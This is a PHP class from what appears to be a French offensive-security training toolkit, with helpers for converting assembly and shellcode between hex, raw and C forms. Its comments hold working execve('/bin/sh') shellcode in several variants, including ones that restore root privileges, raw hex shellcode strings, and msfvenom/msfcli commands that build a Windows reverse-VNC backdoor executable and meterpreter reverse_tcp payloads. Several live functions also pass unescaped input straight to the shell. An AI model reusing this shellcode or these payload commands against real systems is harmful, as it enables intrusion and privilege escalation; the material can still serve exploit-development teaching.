<?php

/*
gmail:
Messages avec pièces jointes

Afin de vous protéger contre d'éventuelles attaques de virus et de logiciels dangereux, vous n'êtes pas autorisé à joindre certains types de fichiers à vos messages Gmail, comme par exemple :

    Différents types de fichiers, y compris sous forme compressée (fichiers GZ ou BZ2, par exemple) ou contenus dans des archives (fichiers ZIP ou TGZ, par exemple)
    Des documents contenant des macros malveillantes
    Des archives protégées par mot de passe dont le contenu est une archive

Remarque : Si vous joignez un document trop volumineux à votre message, ce dernier n'est pas envoyé. En savoir plus sur les limites de taille des fichiers et pièces jointes
Types de fichiers que vous ne pouvez pas joindre à vos e-mails

Afin de protéger votre compte, vous n'êtes pas autorisé à joindre certains types de fichiers à vos messages Gmail. Les logiciels dangereux évoluant constamment, la liste de ces types de fichiers est régulièrement mise à jour. Voici quelques exemples : 

ADE, ADP, APK, BAT, CHM, CMD, COM, CPL, DLL, DMG, EXE, HTA, INS, ISP, JAR, JS, JSE, LIB, LNK, MDE, MSC, MSI, MSP, MST, NSH, PIF, SCR, SCT, SHB, SYS, VB, VBE, VBS, VXD, WSC, WSF, WSH, CAB
 */
class com4bin extends com4malw{

	var $target;
	var $snapshot;
	
	var $path_gdb ;


	
	public function __construct() {
	parent::__construct();
	
	
	
	}

			
	
	
	function payload2check4norme($cmd, $badchars) {
	    $cmd = str_replace('\\','#',$cmd);
	    $cmd = str_replace('"','',$cmd);
	    $cmd = str_replace("'",'',$cmd);
	    $check_resu = "";
	    exec("echo '$cmd' | grep -E 'x(".implode("|",$badchars).")' ",$check_resu);
	    if (!empty($check_resu)) {
	        $this->rouge("Will not Work On $cmd");
	        return false;
	    }
	    return true;
	}
	
	
	
	/*
	 * pas Bon
	 * $cmd1 = "echo '$this->root_passwd' | sudo -S msfcli exploit/multi/handler PAYLOAD=windows/vncinject/reverse_tcp LHOST=$this->host LPORT=$this->port AutoRunScript=/opt/metasploit/apps/pro/msf3/scripts/meterpreter/vnc.rb E";
	 * $cmd3 = "msfvenom --payload  windows/vncinject/reverse_tcp LHOST=$this->host LPORT=$this->port x > $this->file_dir/backdoor_windows_reverse_vnc.exe ";
	 *$this->exec_parallel($cmd1, $cmd3, 0);pause();
	 * vm_upload($xp, "$this->file_dir/backdoor_windows_reverse_vnc.exe", "$dest\\backdoor_windows_reverse_vnc.exe");
	 * virustotal_scan("$this->file_dir/backdoor_windows_reverse_vnc.exe");
	 * pause();
	 */
	/*
	 *
	 * PE editors
	 * Hiew, PE Editor, CFF Explorer, StudPE, LordPE etc
	 */
	

	

	
	
	
	function opcode2hex($opcode) {
		$hex = "";
		$somme = count($opcode);
		for($i = 0; $i < $somme; $i = $i + 2) {
			$j = $i + 1;
			$hex .= "\\x$opcode[$i]" . "$opcode[$j]";
		}
		return $hex;
	}
	
	function asm2hex($shellcode_asm) {
		$this->ssTitre("ASM to HEX" );
		// if (!check_soft_exist("~/metasm/metasm.rb")) $this->install_labs_metasm();
		// requette("echo \"$shellcode_asm\" | ruby ~/metasm/metasm.rb > $dir_tmp/shellcode_asm2hex.hex");
		// objdump -M intel -D /home/$user2local/Bureau/CEH/tmp/ret2libc_32 | grep -E 'dec\s*esp'
		// ("echo \"$shellcode_asm\" | objdump -M intel | grep -E 'dec\s*esp'");
		// requette("echo \"$shellcode_asm\" | ruby /opt/metasploit/apps/pro/msf3/tools/metasm_shell.rb > $dir_tmp/tmp.txt");
		// $tmp = req_ret_tab("echo \"$shellcode_asm\" |  ruby /opt/metasploit/apps/pro/msf3/tools/nasm_shell.rb | tail -1 | cut -d' ' -f5 | grep -iPo \"[a-f0-9]{2}\" > $dir_tmp/tmp.txt; cat ./tmp/tmp.txt | for i in `cat $dir_tmp/tmp.txt` ; do echo \"\\x\$i\" | tr -d '\n' ;done");
		// return $tmp[0];
		$tmp =  $this->req_ret_str( "rasm2 -a x86 -b 32 '$shellcode_asm' " );
		$opcode = str_split ( $tmp  );
		return $this->opcode2hex ( $opcode );
		// return file("$dir_tmp/shellcode_asm2hex.hex");
	}
	

	

	function hex2c($hex) {
		//return "unsigned char shellcode[] =\"$hex\"; \nvoid main(){int *ret;ret = (int *)&ret + 2;(*ret) = (int)shellcode;}"; // Methode 1
		return "unsigned char shellcode[] =\"$hex\"; \nvoid main(){(*(void(*)()) shellcode)();}"; // methode 2
	}
	
	
	function hex2asm($hex) {
		$this->ssTitre( "Shellcode HEX to ASM");
		// requette("echo -ne \"$hex\" | x86dis -e 0 -s intel");
		return trim($this->req_ret_str("bash -c \"/bin/echo -e '$hex'\" | tr -d '\\n' | ndisasm -u - | cut -d' ' -f4- "));
	}
	
	
	
	function raw2size($raw) {
		$hex = $this->raw2hex($raw);
		return $this->hex2size($hex);
	}
	
	

	function hex2base64($hex) {
		$hex = trim($hex);
		$raw = $this->hex2raw($hex);
		return $this->raw2base64();
	}
	function hex2size($hex) {
		$this->ssTitre( "HEX Size");
		$total = trim($this->req_ret_str( "echo '$hex' | wc -c "));
		return trim($this->req_ret_str( "php -r \"echo ($total-1)/4;\" "));
	}
	function hex2rev_32($addr) {
		$addr = $this->hex2norme_32($addr);
		return "\x$addr[8]$addr[9]\x$addr[6]$addr[7]\x$addr[4]$addr[5]\x$addr[2]$addr[3]";
	}
	
	

	
	function hex2norme_32($addr) {
		$addr = trim($addr);
		$addr = str_replace("0x", "", $addr);
		if (strlen($addr) == 4)
			$addr = "0x0000$addr";
			if (strlen($addr) == 5)
				$addr = "0x000$addr";
				if (strlen($addr) == 6)
					$addr = "0x00$addr";
					if (strlen($addr) == 7)
						$addr = "0x0$addr";
						if (strlen($addr) == 8)
							$addr = "0x$addr";
							return trim($addr);
	}
	
	


	function hex2raw($hex) {
		$this->ssTitre( "HEX to RAW");
		// note("test: \"tr -d '\\\x' | xxd -r -p\" ");
		return trim($this->req_ret_str( "bash -c \"/bin/echo -e '$hex'\" ")); // > $this->dir_tmp/shellcode.raw
	}
	
	function hex2graph($hex) {
		$hex = trim($hex);
		$raw = $this->hex2raw($hex);
		$this->raw2graph($raw);
	}



	
	function raw2graph($raw_code) {
		$this->ssTitre( "MAPPING");
	
		$file_raw_obj = new file("");
		$file_raw_path = $file_raw_obj->code2file($raw_code);
		$file_raw_obj->file_raw2dot();
	}
	


	function addr2hex($addr) {
		$addr = hex2norme_32($addr);
		return "\x$addr[2]$addr[3]\x$addr[4]$addr[5]\x$addr[6]$addr[7]\x$addr[8]$addr[9]";
	}
	
	
	
	
	public function addr2add($addr,$add){
		return trim($this->hex2norme_32("0x".dechex(hexdec($addr) + $add)));
	}
	
	public function addr2add4dec($addr,$add){
		return trim($this->hex2norme_32("0x".dechex(hexdec($addr) + $add)));
	}
	
	public function addr2add4hex($addr,$add){
		return trim($this->hex2norme_32("0x".dechex(hexdec($addr) + hexdec($add))));
	}
	
	public function addr2sub($addr,$sub){
		return trim($this->hex2norme_32("0x".dechex(hexdec($addr) - $sub)));
	}
	
	public function addr2sub4dec($addr,$sub){
		return trim($this->hex2norme_32("0x".dechex(hexdec($addr) - $sub)));
	}
	
	public function addr2sub4hex($addr,$sub){
		return trim($this->hex2norme_32("0x".dechex(hexdec($addr) - hexdec($sub))));
	}
	
	
	
	
	

	// $shellcode_hex = '\xda\xdf\xbd\xb2\x9a\x13\x3b\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1\x0b\x31\x6e\x1a\x03\x6e\x1a\x83\xee\xfc\xe2\x47\xf0\x18\x63\x3e\x57\x79\xfb\x6d\x3b\x0c\x1c\x05\x94\x7d\x8b\xd5\x82\xae\x29\xbc\x3c\x38\x4e\x6c\x29\x32\x91\x90\xa9\x6c\xf3\xf9\xc7\x5d\x80\x91\x17\xf5\x35\xe8\xf9\x34\x39';
	// $shellcode_hex = "\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80";
	
	/*
	 * shellcode : est constitué d’opcode
	 *
	 * $user2local @$user2local -Compaq-610:~$ echo "obase=2; 23" | bc
	 * 10111
	 *
	 * msfvenom -p windows/meterpreter/reverse_tcp L=127.0.0.1 -f c | tr -d '"' | tr -d '\n'
	 * requette(" msfcli payload/windows/meterpreter/reverse_tcp_allports S");pause();
	 * // requette(" msfcli payload/windows/dllinject/reverse_tcp_allports S");pause();
	 * requette("msfpayload windows/messagebox EXITFUNC=process ICON=INFORMATION TEXT=\"Blabla\" ");pause();
	 * // session -l -v
	 * // screenshot
	 * // ps + migrate explorer.exe(PID)
	 * // 64Bits
	 * $bin_sh5 = <<<BIN_SH5
	 * xor rdx, rdx
	 * mov qword rbx, '//bin/sh'
	 * shr rbx, 0x8
	 * push rbx
	 * mov rdi, rsp
	 * push rax
	 * push rdi
	 * mov rsi, rsp
	 * mov al, 0x3b
	 * syscall
	 * BIN_SH5;
	 * prog_inst_test_nasm($bin_sh5,"64");
	 *
	 * the shellcode tries to obtain the base address of kernel32.dll using the PEB-based technique.
	 */
	
	
	
	
	
	
	
	



	

	
	// ===================================================================================
	
	// #################################### SHELLCODE #######################################################
	
	/*
	 *
	 *
	 *
	 * // ========================================================================
	 *
	 *
	 *
	 *
	 * // ========================================================================
	 *
	 * $write_asm2 = <<<WRT2
	 * section .text ; Text segment
	 * global _start ; Default entry point for ELF linking
	 * _start:
	 * ;_write
	 * xor %eax,%eax ; Pour éviter les segmentfaults
	 * xor %ebx,%ebx ; // //
	 * xor %ecx,%ecx ; // //
	 * xor %edx,%edx ; // //
	 *
	 * movb $0x9,%dl ; on place la taille de notre mot dans dl(edx) donc jonathan + \n | 8+1=9
	 * pushl $0x0a ; on commence à empiler notre line feed (\n) = 0x0a
	 * push $0x6e616874 ; naht
	 * push $0x616e6f6a ; onaj
	 * movl %esp,%ecx ; on envoie %esp dans %ecx le registre qui contient la constante char de _write
	 * movb $0x1,%bl ; ici 1 pour %ebx,
	 * movb $0x4,%al ; et ici le syscall de _write donc 4
	 * int $0x80 ; on exécute
	 *
	 * ;_exit
	 * xor %ebx,%ebx ; %ebx = 0
	 * movb $0x1,%al ; %eax = 1 (syscall de _exit)
	 * int $0x80 ; on exécute
	 * WRT2;
	 * system("echo \"$write_asm2\" > $dir_tmp/write_asm2.s");
	 * requette("cat -n $dir_tmp/write_asm2.s");
	 * prog_asm2object("$dir_tmp/write_asm2.s");
	 * prog_object2bin("$dir_tmp/write_asm2.o");
	 * requette("$dir_tmp/write_asm2");
	 * pause();
	 * requette("objdump -d $dir_tmp/write_asm2");
	 *
	 * // ============================================================================
	 *
	 * $write_asm8 = <<<WRT8
	 * int main()
	 * {
	 * asm(\"jmp appel_sous_routine
	 *
	 * sous_routine:
	 * popl %esi // Récupérer l'adresse de /bin/sh
	 * movl %esi,0x8(%esi) // L'écrire en première position de la table
	 * xorl %eax,%eax // Écrire NULL en seconde position de la table
	 * movl %eax,0xc(%esi)
	 * movb %eax,0x7(%esi) // Placer l'octet nul en fin de chaîne
	 * movb $0xb,%al // Fonction execve()
	 * movl %esi, %ebx // Chaîne à exécuter dans %ebx
	 * leal 0x8(%esi),%ecx // Table arguments dans %ecx
	 * leal 0xc(%esi),%edx // Table environnement dans %edx
	 * int $0x80 // Appel-système
	 *
	 * xorl %ebx,%ebx // Code de retour nul
	 * movl %ebx,%eax // Fonction _exit() : %eax = 1
	 * inc %eax
	 * int $0x80 // Appel-système
	 *
	 * appel_sous_routine:
	 * call sous_routine
	 * .string '/bin/sh'
	 * \");
	 * }
	 * WRT8;
	 * system("echo \"$write_asm8\" > $dir_tmp/write_asm8.c");
	 * requette("cat -n $dir_tmp/write_asm8.c");
	 * requette("gcc -o $dir_tmp/write_asm8 $dir_tmp/write_asm8.c;chmod +x $dir_tmp/write_asm8");
	 * requette("$dir_tmp/write_asm8");
	 * $shellcode_testo = shellcode_extract_from_bin_file("$dir_tmp/write_asm8");
	 * shellcode_test($shellcode_testo,"-m32");
	 * pause();
	 * ssTitre("les Octets Nuls");
	 * requette("objdump -d $dir_tmp/write_asm8");
	 * pause();
	 *
	 * // ============================================================================
	 *
	 *
	 * $write_asm8 = <<<WRT8
	 * jmp appel_sous_routine
	 *
	 * sous_routine:
	 * popl %esi ; Récupérer l'adresse de /bin/sh
	 * movl %esi,0x8(%esi) ; L'écrire en première position de la table
	 * xorl %eax,%eax ; Écrire NULL en seconde position de la table
	 * movl %eax,0xc(%esi)
	 * movb %eax,0x7(%esi) ; Placer l'octet nul en fin de chaîne
	 * movb $0xb,%al ; Fonction execve()
	 * movl %esi, %ebx ; Chaîne à exécuter dans %ebx
	 * leal 0x8(%esi),%ecx ; Table arguments dans %ecx
	 * leal 0xc(%esi),%edx ; Table environnement dans %edx
	 * int $0x80 ; Appel-système
	 *
	 * xorl %ebx,%ebx ; Code de retour nul
	 * movl %ebx,%eax ; Fonction _exit() : %eax = 1
	 * inc %eax
	 * int $0x80 ; Appel-système
	 *
	 * appel_sous_routine:
	 * call sous_routine
	 * .string '/bin/sh'
	 * WRT8;
	 * system("echo \"$write_asm8\" > $dir_tmp/write_asm8.s");
	 * requette("cat -n $dir_tmp/write_asm8.s");
	 * prog_asm2object("$dir_tmp/write_asm8.s");
	 * prog_object2bin("$dir_tmp/write_asm8.o");
	 * requette("$dir_tmp/write_asm8");
	 * pause();
	 * pause();
	 * requette("objdump -d $dir_tmp/write_asm8");
	 * pause();
	 *
	 * // ============================================================================
	 * $bin_sh2 = <<<BIN_SH2
	 * main:
	 * xorl %eax,%eax // Pour éviter les segmentfaults
	 * xorl %ebx,%ebx // Pour éviter les segmentfaults
	 * xorl %ecx,%ecx // Pour éviter les segmentfaults
	 * xorl %edx,%edx // Pour éviter les segmentfaults
	 *
	 * //On doit récupérer les arguments de execve :
	 * //ebx = "/bin/sh"
	 * //ecx = tab = {"/bin/sh",0}
	 * //edx = n°3: 0
	 *
	 * //De plus, eax = 11, le syscall
	 *
	 * //empile 0
	 * push %edx
	 *
	 * //On doit empiler "/bin/sh". Or on est sur la pile et sur une architecture x86.
	 * //Donc on doit empiler 4 octets par 4 octets, on rajoute donc un/.
	 * //De plus on doit empiler à l'envers, dans deux sens :
	 * // - dans le sens "4 derniers octets puis 4 premiers octets"
	 * // - dans le sens "tous les octets sont inversés"
	 * //on pushe donc en premier 'hs/n', puis 'ib//'
	 * push $0x68732f6e
	 * push $0x69622f2f
	 *
	 *
	 * //on récupère l'adresse de la chaîne
	 * mov %esp,%ebx
	 *
	 * //empile 0
	 * push %edx
	 *
	 * //empile l'adresse de l'adresse de la chaîne (c'est à dire tab)
	 * push %ebx
	 *
	 * //on récupère l'adresse de tab
	 * mov %esp,%ecx
	 *
	 * //exécute l'interruption
	 * mov $11,%al
	 * int $0x80
	 * BIN_SH2;
	 * requette("echo \"$bin_sh2\" > $dir_tmp/bin_sh2.s");
	 * prog_asm2object("$dir_tmp/bin_sh2.s");
	 * prog_object2bin("$dir_tmp/bin_sh2.o");
	 * requette("$dir_tmp/bin_sh2");
	 * pause();
	 * // ===============================================================================
	 * ssTitre("Sys CALL exit");
	 *
	 * remarque("Maintenant nous allons étudier l'appel système _exit.\nici _exit aura besoin du registre ebx pour y contenir un entier nous allons donc essayer de faire l'équivalent de exit(0);");
	 * article("N°"," Appel System de exit");
	 * requette("cat $unistd[0] | grep \"_exit\" | head -1");
	 * system("echo \"section .text\n\tglobal _start\n_start:\n\tmov eax,1\n\txor ebx,ebx\n\tint 0x80\n\" > $dir_tmp/exit.s");
	 * requette("cat $dir_tmp/exit.s");
	 *
	 * prog_asm2object("$dir_tmp/exit.s");
	 * prog_object2bin("$dir_tmp/exit.o");
	 * requette("$dir_tmp/exit");
	 *
	 *
	 * system("echo \"void main(){char *line = \\\"Hello World !\\\";write(1, line, strlen(line));exit(0);} \" > $dir_tmp/helloworld3.c");
	 * requette("cat $dir_tmp/helloworld3.c");
	 * requette("gcc -o $dir_tmp/helloworld3 $dir_tmp/helloworld3.c;chmod +x $dir_tmp/helloworld3");
	 * requette("$dir_tmp/helloworld3");
	 * pause();
	 *
	 *
	 * section .data ; Data segment
	 * msg db 'Hello, world!', 0x0a ; The string and newline char
	 * section .text ; Text segment
	 * global _start ; Default entry point for ELF linking
	 * _start:
	 * ; SYSCALL: write(1,msg, 14)
	 * mov eax, 4 ;Put 4 into eax, since write is syscall #4.
	 * mov ebx, 1 ;Put 1 into ebx, since stdout is 1.
	 * mov ecx, msg ;Put the address of the string into ecx.
	 * mov edx, 14 ;Put 14 into edx, since our string is 14 bytes.
	 * int 0x80 ;Call the kernel to make the system call happen.
	 * ; SYSCALL: exit(0)
	 * mov eax, 1 ; Put 1 into eax, since exit is syscall #1.
	 * mov ebx, 0 ; Exit with success.
	 * int 0x80 ; Do the syscall.
	 *
	 *
	 *
	 *
	 *
	 * $write_asm7 = <<<WRT7
	 * global _start ; Default entry point for ELF linking
	 * _start:
	 * ; write(1, 'hello, world!', 14)
	 * push word 0x0a21
	 * push 0x646c726f
	 * push 0x77202c6f
	 * push 0x6c6c6568
	 * mov ecx, esp
	 * push byte 4
	 * pop eax
	 * push byte 1
	 * pop ebx
	 * push byte 14
	 * pop edx
	 * int 0x80
	 * ; exit(0)
	 * mov eax, ebx
	 * xor ebx, ebx
	 * int 0x80
	 * WRT7;
	 * system("echo \"$write_asm7\" > $dir_tmp/write_asm7.s");
	 * requette("cat -n $dir_tmp/write_asm7.s");
	 * ascii2hex('hello, world!');
	 * pause();
	 * prog_asm2object("$dir_tmp/write_asm7.s");
	 * prog_object2bin("$dir_tmp/write_asm7.o");
	 * requette("$dir_tmp/write_asm7");
	 * pause();
	 * ssTitre("les Octets Nuls");
	 * requette("objdump -d $dir_tmp/write_asm7");
	 * pause();
	 *
	 *
	 *
	 * system("echo \"void main(){shellcode();}void shellcode(){system(\\\"/bin/sh\\\");}\" > $dir_tmp/bin_sh.c");
	 * requette("cat $dir_tmp/bin_sh.c");
	 * requette("gcc -m32 -o $dir_tmp/bin_sh $dir_tmp/bin_sh.c;chmod +x $dir_tmp/bin_sh");
	 * requette("$dir_tmp/bin_sh");
	 * pause();
	 * $programme = "$dir_tmp/bin_sh";
	 * pause();
	 * requette("strace -s 999 -v -f $dir_tmp/bin_sh");
	 * pause();
	 *
	 *
	 *
	 * $bin_sh3 = <<< BIN_SH3
	 * global _start ; Default entry point for ELF linking
	 * _start:
	 * ; setresuid(uid_t ruid, uid_t euid, uid_t suid);
	 * xor eax, eax ; zero out eax
	 * xor ebx, ebx ; zero out ebx
	 * xor ecx, ecx ; zero out ecx
	 * cdq ; zero out edx using the sign bit from eax
	 * mov BYTE al, 0xa4 ; syscall 164 (0xa4)
	 * int 0x80 ; setresuid(0, 0, 0) restore all root privs
	 *
	 * ; execve(const char *filename, char *const argv [], char *const envp[])
	 * push BYTE 11 ; push 11 to the stack
	 * pop eax ; pop dword of 11 into eax
	 * push ecx ; push some nulls for string termination
	 * push 0x68732f2f ; push "//sh" to the stack
	 * push 0x6e69622f ; push "/bin" to the stack
	 * mov ebx, esp ; put the address of "/bin//sh" into ebx, via esp
	 * push ecx ; push 32-bit null terminator to stack
	 * mov edx, esp ; this is an empty array for envp
	 * push ebx ; push string addr to stack above null terminator
	 * mov ecx, esp ; this is the argv array with string ptr
	 * int 0x80 ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
	 * BIN_SH3;
	 * system("echo \"$bin_sh3\" > $dir_tmp/bin_sh3.s");
	 *
	 * requette("cat -n $dir_tmp/bin_sh3.s");
	 * prog_asm2object("$dir_tmp/bin_sh3.s");
	 * prog_object2bin("$dir_tmp/bin_sh3.o");
	 * requette("$dir_tmp/bin_sh3");
	 * $shellcode_bin_sh = shellcode_bin2hex("$dir_tmp/bin_sh3") ;
	 * shellcode_test($shellcode_bin_sh,"-m32");
	 * requette("objdump -d $dir_tmp/bin_sh3");
	 * pause();
	 *
	 *
	 * $bin_sh4 = <<< BIN_SH4
	 * section .data
	 * name db '/bin/sh', 0
	 * section .text
	 * global _start
	 * _start:
	 * ; setreuid(0, 0)
	 * mov eax, 70
	 * mov ebx, 0
	 * mov ecx, 0
	 * int 0x80
	 * ; execve('/bin/sh',['/bin/sh', NULL], NULL)
	 * mov eax, 11
	 * mov ebx, name
	 * push 0
	 * push name
	 * mov ecx, esp
	 * mov edx, 0
	 * int 0x80
	 * BIN_SH4;
	 * system("echo \"$bin_sh4\" > $dir_tmp/bin_sh4.s");
	 * requette("cat -n $dir_tmp/bin_sh4.s");
	 * prog_asm2object("$dir_tmp/bin_sh4.s");
	 * prog_object2bin("$dir_tmp/bin_sh4.o");
	 * requette("$dir_tmp/bin_sh4");
	 * $shellcode_bin_sh = shellcode_bin2hex("$dir_tmp/bin_sh4") ;
	 * shellcode_test($shellcode_bin_sh,"-m32");
	 * requette("objdump -d $dir_tmp/bin_sh4");
	 * pause();
	 *
	 * $bin_sh5 = <<<BIN_SH5
	 * global _start
	 * _start:
	 * ; setreuid(0, 0)
	 * mov eax, 70
	 * mov ebx, 0
	 * mov ecx, 0
	 * int 0x80
	 * jmp two
	 * one:
	 * ; execve('/bin/sh',['/bin/sh', NULL], NULL)
	 * mov eax, 11
	 * pop ebx
	 * push 0
	 * push ebx
	 * mov ecx, esp
	 * mov edx, 0
	 * int 0x80
	 * two:
	 * call one
	 * db '/bin/sh', 0
	 * BIN_SH5;
	 * system("echo \"$bin_sh5\" > $dir_tmp/bin_sh5.s");
	 * requette("cat -n $dir_tmp/bin_sh5.s");
	 * prog_asm2object("$dir_tmp/bin_sh5.s");
	 * prog_object2bin("$dir_tmp/bin_sh5.o");
	 * requette("$dir_tmp/bin_sh5");
	 * $shellcode_bin_sh = shellcode_bin2hex("$dir_tmp/bin_sh5") ;
	 * shellcode_test($shellcode_bin_sh,"-m32");
	 * requette("objdump -d $dir_tmp/bin_sh5");
	 * pause();
	 *
	 *
	 */
	
	// ##################################################################################################
	
	
}	
	
